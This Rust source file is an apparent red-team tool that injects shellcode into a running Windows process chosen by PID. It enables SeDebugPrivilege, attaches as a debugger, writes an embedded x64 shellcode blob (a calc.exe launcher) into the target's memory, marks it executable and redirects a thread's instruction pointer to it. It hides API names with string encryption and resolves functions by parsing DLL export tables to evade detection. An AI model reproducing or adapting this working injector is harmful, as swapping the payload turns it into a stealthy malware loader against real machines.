#![allow(non_camel_case_types)]
#![allow(non_snake_case)]

use winapi::{
    shared::{
        minwindef::{BOOL, DWORD},
        ntdef::{HANDLE, NTSTATUS},
    },
    um::{
        minwinbase::{DEBUG_EVENT, LPCONTEXT},
        winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED},
    },
};

use noldr::{self, HMODULE, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64, TEB};

use std::ffi::c_void;

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

//shellcode for popping calc

pub const SHELL_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

// Get NtGetNextProcess function pointer
type NtGetNextProcessFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    DesiredAccess: u32,
    HandleAttributes: u32,
    Flags: u32,
    NewProcessHandle: *mut HANDLE,
) -> i32;

type GetProcessIdFn = unsafe extern "system" fn(HANDLE) -> u32;

type GetCurrentProcessFn = unsafe extern "system" fn() -> HANDLE;

// Add this type definition near your other ones
type NtOpenProcessTokenFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    DesiredAccess: ACCESS_MASK,
    TokenHandle: *mut HANDLE,
) -> NTSTATUS;

// Add these type definitions at the top
#[repr(C)]
struct TOKEN_PRIVILEGES {
    PrivilegeCount: u32,
    Privileges: [LUID_AND_ATTRIBUTES; 1],
}

#[repr(C)]
struct LUID {
    LowPart: u32,
    HighPart: i32,
}

#[repr(C)]
struct LUID_AND_ATTRIBUTES {
    Luid: LUID,
    Attributes: u32,
}

const SE_PRIVILEGE_ENABLED: u32 = 0x00000002;

type NtAdjustPrivilegesTokenFn = unsafe extern "system" fn(
    TokenHandle: HANDLE,
    DisableAllPrivileges: BOOL,
    NewState: *const TOKEN_PRIVILEGES,
    BufferLength: u32,
    PreviousState: *mut TOKEN_PRIVILEGES,
    ReturnLength: *mut u32,
) -> NTSTATUS;

const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const TOKEN_QUERY: u32 = 0x0008;

// Add near your other type definitions
type NtCloseFn = unsafe extern "system" fn(Handle: HANDLE) -> NTSTATUS;

type DebugActiveProcessFn = unsafe extern "system" fn(dwProcessId: DWORD) -> BOOL;

type IMAGE_NT_HEADERS = IMAGE_NT_HEADERS64;

// Add with other type definitions at the top
type LookupPrivilegeValueFn = unsafe extern "system" fn(
    lpSystemName: *const i8,
    lpName: *const i8,
    lpLuid: *mut LUID,
) -> BOOL;

// Add with other constants
const SE_DEBUG_NAME: &str = "SeDebugPrivilege\0";

// Add with other type definitions
type DebugActiveProcessStopFn = unsafe extern "system" fn(dwProcessId: DWORD) -> BOOL;

type WaitForDebugEventFn =
    unsafe extern "system" fn(lpDebugEvent: *mut DEBUG_EVENT, dwMilliseconds: DWORD) -> BOOL;

type GetThreadContext = unsafe extern "system" fn(hThread: HANDLE, lpContext: LPCONTEXT) -> BOOL;

// Add near the top with other constants
const CONTEXT_INTEGER: u32 = 0x00010002;
const CONTEXT_CONTROL: u32 = 0x00010001;

// Add with other type definitions
type SetThreadContextFn =
    unsafe extern "system" fn(hThread: HANDLE, lpContext: *const CONTEXT) -> BOOL;

// Add with other constants at the top
const EXCEPTION_DEBUG_EVENT: DWORD = 1;
const EXCEPTION_SINGLE_STEP: DWORD = 0x80000004;
const DBG_CONTINUE: DWORD = 0x00010002;
const DBG_EXCEPTION_NOT_HANDLED: DWORD = 0x80010001;

// Add with other type definitions
type ContinueDebugEventFn = unsafe extern "system" fn(
    dwProcessId: DWORD,
    dwThreadId: DWORD,
    dwContinueStatus: DWORD,
) -> BOOL;

// Add with other type definitions
type VirtualAllocExFn = unsafe extern "system" fn(
    hProcess: HANDLE,
    lpAddress: *mut c_void,
    dwSize: usize,
    flAllocationType: DWORD,
    flProtect: DWORD,
) -> *mut c_void;

type WriteProcessMemoryFn = unsafe extern "system" fn(
    hProcess: HANDLE,
    lpBaseAddress: *mut c_void,
    lpBuffer: *const c_void,
    nSize: usize,
    lpNumberOfBytesWritten: *mut usize,
) -> BOOL;

// Add with other constants
const MEM_COMMIT: DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const PAGE_READWRITE: DWORD = 0x04;
const PAGE_EXECUTE_READ: DWORD = 0x20;

// Add VirtualProtectEx type definition
type VirtualProtectExFn = unsafe extern "system" fn(
    hProcess: HANDLE,
    lpAddress: *const c_void,
    dwSize: usize,
    flNewProtect: DWORD,
    lpflOldProtect: *mut DWORD,
) -> BOOL;

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2 {
        println!("Usage: {} <pid>", args[0]);
        return;
    }

    let target_pid: u32 = match args[1].parse() {
        Ok(pid) => pid,
        Err(_) => {
            println!("Error: PID must be a valid number");
            return;
        }
    };

    println!("[+] Targeting PID {}", target_pid);

    let teb: *const TEB = noldr::get_teb();
    println!("[+] TEB address: {:?}", teb);

    let ntdll = noldr::get_dll_address("ntdll.dll".to_string(), teb).unwrap();
    println!("[+] ntdll.dll address: {:?}", ntdll);

    let kernel32 = noldr::get_dll_address("kernel32.dll".to_string(), teb).unwrap();
    println!("[+] kernel32.dll address: {:?}", kernel32);

    //load advapi.dll
    let advapi32 = load_dll("advapi32.dll", kernel32);
    println!("[+] advapi32.dll handle: {:?}", advapi32);
    //deref the handle to get the base address
    let advapi32_base = unsafe { std::mem::transmute::<HMODULE, *const c_void>(advapi32) };
    println!("[+] advapi32.dll address: {:?}", advapi32_base);

    locate_process(target_pid, ntdll, kernel32).unwrap();

    elevate_debug(ntdll, kernel32, advapi32_base).unwrap();

    //debug the target process
    let debug_active_process = noldr::get_function_address(kernel32, "DebugActiveProcess")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] DebugActiveProcess address: {:?}", debug_active_process);

    let debug_active_process: DebugActiveProcessFn =
        unsafe { std::mem::transmute(debug_active_process) };

    //check if the process is being debugged
    let is_debugged = unsafe { debug_active_process(target_pid as DWORD) };
    println!(
        "[+] Successfully attached to process as debugger: {}",
        is_debugged != 0
    );

    let debug_active_process_stop =
        noldr::get_function_address(kernel32, &lc!("DebugActiveProcessStop"))
            .unwrap_or_else(|| std::ptr::null_mut());
    println!(
        "[+] DebugActiveProcessStop address: {:?}",
        debug_active_process_stop
    );

    let debug_active_process_stop: DebugActiveProcessStopFn =
        unsafe { std::mem::transmute(debug_active_process_stop) };

    let mut debug_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };

    let wait_for_debug_event = noldr::get_function_address(kernel32, &lc!("WaitForDebugEvent"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] WaitForDebugEvent address: {:?}", wait_for_debug_event);

    let wait_for_debug_event: WaitForDebugEventFn =
        unsafe { std::mem::transmute(wait_for_debug_event) };

    const INFINITE: DWORD = 0xFFFFFFFF;
    let mut tid: DWORD = 0;
    let mut h_process: HANDLE = std::ptr::null_mut();
    let mut h_thread: HANDLE = std::ptr::null_mut();

    let success = unsafe { wait_for_debug_event(&mut debug_event, INFINITE) };
    if success != 0 {
        tid = debug_event.dwThreadId;
        h_process = unsafe { debug_event.u.CreateProcessInfo().hProcess };
        h_thread = unsafe { debug_event.u.CreateProcessInfo().hThread };
        println!(
            "[+] Debug event received - TID: {}, Process Handle: {:?}, Thread Handle: {:?}",
            tid, h_process, h_thread
        );
    }

    //locate address for GetThreadContext in kernel32

    let get_thread_context = noldr::get_function_address(kernel32, &lc!("GetThreadContext"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] GetThreadContext address: {:?}", get_thread_context);

    let get_thread_context: GetThreadContext = unsafe { std::mem::transmute(get_thread_context) };

    let mut original_context: CONTEXT = unsafe { std::mem::zeroed() };
    let mut current_context: CONTEXT = unsafe { std::mem::zeroed() };

    // Set the context flags
    original_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

    let success = unsafe { get_thread_context(h_thread, &mut original_context) };
    if success != 0 {
        println!("[+] Got original thread context");

        // Get current context (for single step)
        let success = unsafe { get_thread_context(h_thread, &mut current_context) };
        if success != 0 {
            println!("[+] Got current thread context");
        }
    }

    // In main after getting contexts
    current_context.EFlags |= 0x100;

    let set_thread_context = noldr::get_function_address(kernel32, &lc!("SetThreadContext"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] SetThreadContext address: {:?}", set_thread_context);

    let set_thread_context: SetThreadContextFn = unsafe { std::mem::transmute(set_thread_context) };

    let success = unsafe { set_thread_context(h_thread, &current_context) };
    if success != 0 {
        println!("[+] Successfully set thread context with single step flag");
    }

    // After getting the debug event but before the debug loop:
    let virtual_alloc_ex = noldr::get_function_address(kernel32, &lc!("VirtualAllocEx"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] VirtualAllocEx address: {:?}", virtual_alloc_ex);
    let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(virtual_alloc_ex) };

    let write_process_memory = noldr::get_function_address(kernel32, &lc!("WriteProcessMemory"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] WriteProcessMemory address: {:?}", write_process_memory);
    let write_process_memory: WriteProcessMemoryFn =
        unsafe { std::mem::transmute(write_process_memory) };

    // Get VirtualProtectEx function address
    let virtual_protect_ex = noldr::get_function_address(kernel32, &lc!("VirtualProtectEx"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] VirtualProtectEx address: {:?}", virtual_protect_ex);
    let virtual_protect_ex: VirtualProtectExFn = unsafe { std::mem::transmute(virtual_protect_ex) };

    // Allocate memory for shellcode with RW permissions initially
    let shellcode_address = unsafe {
        virtual_alloc_ex(
            h_process,
            std::ptr::null_mut(),
            SHELL_CODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,  // Changed from PAGE_EXECUTE_READWRITE
        )
    };
    println!(
        "[+] Allocated memory for shellcode at: {:?}",
        shellcode_address
    );

    // Write shellcode to allocated memory
    let mut bytes_written: usize = 0;
    let success = unsafe {
        write_process_memory(
            h_process,
            shellcode_address,
            SHELL_CODE.as_ptr() as *const c_void,
            SHELL_CODE.len(),
            &mut bytes_written,
        )
    };
    println!("[+] Wrote {} bytes of shellcode", bytes_written);

    // Change permissions to RX
    let mut old_protect: DWORD = 0;
    let success = unsafe {
        virtual_protect_ex(
            h_process,
            shellcode_address,
            SHELL_CODE.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if success != 0 {
        println!("[+] Changed memory protection to RX");
    } else {
        println!("[!] Failed to change memory protection");
    }

    // After setting thread context with single step flag
    let continue_debug_event = noldr::get_function_address(kernel32, &lc!("ContinueDebugEvent"))
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] ContinueDebugEvent address: {:?}", continue_debug_event);

    let continue_debug_event: ContinueDebugEventFn =
        unsafe { std::mem::transmute(continue_debug_event) };

    let mut cpt = 0;
    while cpt < 1 {
        if debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
            println!("[*] Got debug event: Exception");
            let exception_code = unsafe { debug_event.u.Exception().ExceptionRecord.ExceptionCode };
            
            if exception_code == 0x80000003 { // Breakpoint
                println!("[*] Got breakpoint exception");
                
                current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
                let success = unsafe { get_thread_context(h_thread, &mut current_context) };
                if success != 0 {
                    println!("[*] Current RIP before redirect: {:x}", current_context.Rip);
                    println!("[*] Current RSP: {:x}", current_context.Rsp);
                    println!("[*] Current EFLAGS: {:x}", current_context.EFlags);
                    
                    // Ensure stack is 16-byte aligned for x64 calling convention
                    current_context.Rsp &= !0xF;
                    // Allocate some stack space for our shellcode
                    current_context.Rsp -= 0x2000;
                    
                    // Clear registers that shellcode might depend on
                    current_context.Rcx = 0;
                    current_context.Rdx = 0;
                    current_context.R8 = 0;
                    current_context.R9 = 0;
                    
                    // Set RIP to shellcode
                    current_context.Rip = shellcode_address as u64;
                    println!("[*] Setting RIP to shellcode address: {:x}", shellcode_address as u64);
                    println!("[*] Adjusted RSP to: {:x}", current_context.Rsp);
                    
                    let success = unsafe { set_thread_context(h_thread, &mut current_context) };
                    if success != 0 {
                        println!("[*] Successfully set thread context with shellcode entry");
                        
                        // Continue execution
                        unsafe { 
                            continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
                        }
                        
                        // Wait for any exceptions
                        let mut shellcode_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
                        while unsafe { wait_for_debug_event(&mut shellcode_event, 1000) } != 0 {
                            if shellcode_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
                                let exception_code = unsafe { shellcode_event.u.Exception().ExceptionRecord.ExceptionCode };
                                println!("[!] Exception during shellcode: {:x}", exception_code);
                            }
                            unsafe {
                                continue_debug_event(
                                    shellcode_event.dwProcessId,
                                    shellcode_event.dwThreadId,
                                    DBG_CONTINUE
                                );
                            }
                        }
                        
                        cpt += 1;
                    }
                }
            } else {
                println!("[*] Got different exception: {:x}", exception_code);
                unsafe { 
                    continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_EXCEPTION_NOT_HANDLED);
                }
            }
        } else {
            if debug_event.dwDebugEventCode != 2 && debug_event.dwDebugEventCode != 6 {
                println!("[*] Got debug event type: {}", debug_event.dwDebugEventCode);
            }
            unsafe { 
                continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
            }
        }
        
        if cpt == 0 {
            unsafe { 
                wait_for_debug_event(&mut debug_event, INFINITE);
            }
        }
    }

    // After the debug loop
    println!("[+] Resuming process");
    original_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    
    let success = unsafe { set_thread_context(h_thread, &original_context) };
    if success == 0 {
        println!("[!] Failed to restore original context");
    }
    
    unsafe { 
        continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }

        // After the debug loop, before detaching
        println!("[*] Press Enter to detach and exit...");
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();

    //this should always be at the end of main during dev
    println!("[+] Stopping debug on target process");
    unsafe { debug_active_process_stop(target_pid as DWORD) };
}

fn locate_process(
    target_pid: u32,
    ntdll: *const c_void,
    kernel32: *const c_void,
) -> Result<(), Box<dyn std::error::Error>> {
    let nt_get_next_process = noldr::get_function_address(ntdll, "NtGetNextProcess")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] NtGetNextProcess address: {:?}", nt_get_next_process);

    let get_process_id = noldr::get_function_address(kernel32, "GetProcessId")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] GetProcessId address: {:?}", get_process_id);
    let get_process_id: GetProcessIdFn = unsafe { std::mem::transmute(get_process_id) };

    let mut handle: HANDLE = std::ptr::null_mut();
    let mut target_handle: HANDLE = std::ptr::null_mut();

    while unsafe {
        std::mem::transmute::<_, NtGetNextProcessFn>(nt_get_next_process)(
            handle,
            MAXIMUM_ALLOWED,
            0,
            0,
            &mut handle,
        )
    } == 0
    {
        let pid = unsafe { get_process_id(handle) };
        //println!("[*] Checking PID: {}", pid);

        if pid == target_pid {
            println!("[+] Found target process");
            target_handle = handle;
            break;
        }
    }

    println!("[+] Target process handle: {:?}", target_handle);

    Ok(())
}

fn elevate_debug(
    ntdll: *const c_void,
    kernel32: *const c_void,
    advapi32: *const c_void,
) -> Result<(), Box<dyn std::error::Error>> {
    //locate NtOpenProcessToken
    let nt_open_process_token = noldr::get_function_address(ntdll, "NtOpenProcessToken")
        .unwrap_or_else(|| std::ptr::null_mut());

    if nt_open_process_token.is_null() {
        println!("[!] Failed to get NtOpenProcessToken address");
        return Err("NtOpenProcessToken address is null".into());
    }
    println!(
        "[+] NtOpenProcessToken address: {:?}",
        nt_open_process_token
    );

    let nt_open_process_token: NtOpenProcessTokenFn =
        unsafe { std::mem::transmute(nt_open_process_token) };

    let mut token_handle: HANDLE = std::ptr::null_mut();

    let get_current_process = noldr::get_function_address(kernel32, "GetCurrentProcess")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] GetCurrentProcess address: {:?}", get_current_process);

    let current_process: GetCurrentProcessFn = unsafe { std::mem::transmute(get_current_process) };

    println!("[*] Debug - About to call NtOpenProcessToken");
    let status = unsafe {
        println!("[*] About to make the call");
        let result = nt_open_process_token(
            current_process(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        );
        println!("[*] Call completed");
        result
    };

    if status != 0 {
        println!("[!] NtOpenProcessToken failed with status: {}", status);
        return Err("Failed to open process token".into());
    }

    if token_handle.is_null() {
        println!("[!] Token handle is null despite successful call");
        return Err("Received null token handle".into());
    }

    println!("[+] Successfully opened process token: {:?}", token_handle);

    let lookup_privilege_value =
        noldr::get_function_address(advapi32, &lc!("LookupPrivilegeValueA"))
            .unwrap_or_else(|| std::ptr::null_mut());
    println!(
        "[+] LookupPrivilegeValueA address: {:?}",
        lookup_privilege_value
    );

    let mut luid = LUID {
        LowPart: 0,
        HighPart: 0,
    };

    let success = unsafe {
        let lookup_privilege_value: LookupPrivilegeValueFn =
            std::mem::transmute(lookup_privilege_value);
        lookup_privilege_value(
            std::ptr::null(),
            SE_DEBUG_NAME.as_ptr() as *const i8,
            &mut luid,
        )
    };

    if success == 0 {
        println!("[!] LookupPrivilegeValue failed");
        std::process::exit(1);
    }

    let priv_struct = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, "NtAdjustPrivilegesToken")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!(
        "[+] NtAdjustPrivilegesToken address: {:?}",
        nt_adjust_privileges_token
    );

    let status = unsafe {
        let nt_adjust_privileges_token: NtAdjustPrivilegesTokenFn =
            std::mem::transmute(nt_adjust_privileges_token);
        println!("[*] Attempting to adjust token privileges...");
        nt_adjust_privileges_token(
            token_handle,
            0,
            &priv_struct,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    if status != 0 {
        println!(
            "[!] NtAdjustPrivilegesToken failed with status code: {:#x}",
            status
        );
        std::process::exit(1);
    }

    println!("[+] Successfully enabled SeDebugPrivilege!");

    // After you're done with the token_handle:
    let nt_close =
        noldr::get_function_address(ntdll, "NtClose").unwrap_or_else(|| std::ptr::null_mut());

    let status = unsafe {
        let nt_close: NtCloseFn = std::mem::transmute(nt_close);
        nt_close(token_handle)
    };

    if status != 0 {
        println!("[!] NtClose failed with status: {}", status);
        return Err("Failed to close token handle".into());
    }

    println!("[+] Successfully closed token handle");

    Ok(())
}

//for loading the dll and getting a handle to it
pub fn load_dll(dll_name: &str, kernel32_base: *const c_void) -> HMODULE {
    unsafe {
        // Get the base address of kernel32.dll
        //let kernel32_base = get_dll_address("kernel32.dll".to_string(), get_teb()).unwrap();

        // Get the address of LoadLibraryA function
        let load_library_a = get_function_address(kernel32_base, &lc!("LoadLibraryA")).unwrap();
        let load_library_a: extern "system" fn(*const i8) -> HMODULE =
            std::mem::transmute(load_library_a);

        // Convert dll_name to a C-style string
        let c_dll_name = std::ffi::CString::new(dll_name).unwrap();

        // Call LoadLibraryA to get the handle
        load_library_a(c_dll_name.as_ptr())
    }
}

//get the address of a function in a dll
pub fn get_function_address(dll_base: *const c_void, function_name: &str) -> Option<*const c_void> {
    unsafe {
        let dos_header = &*(dll_base as *const IMAGE_DOS_HEADER);
        let nt_headers =
            &*((dll_base as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
        let export_directory_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
        let export_directory = &*((dll_base as usize + export_directory_rva as usize)
            as *const IMAGE_EXPORT_DIRECTORY);

        let names_rva = export_directory.AddressOfNames;
        let functions_rva = export_directory.AddressOfFunctions;
        let ordinals_rva = export_directory.AddressOfNameOrdinals;

        let names = std::slice::from_raw_parts(
            (dll_base as usize + names_rva as usize) as *const u32,
            export_directory.NumberOfNames as usize,
        );
        let ordinals = std::slice::from_raw_parts(
            (dll_base as usize + ordinals_rva as usize) as *const u16,
            export_directory.NumberOfNames as usize,
        );

        for i in 0..export_directory.NumberOfNames as usize {
            let name_ptr = (dll_base as usize + names[i] as usize) as *const u8;
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
                .to_str()
                .unwrap_or_default();
            if name == function_name {
                let ordinal = ordinals[i] as usize;
                let function_rva =
                    *((dll_base as usize + functions_rva as usize) as *const u32).add(ordinal);
                return Some((dll_base as usize + function_rva as usize) as *const c_void);
            }
        }
    }
    None
}
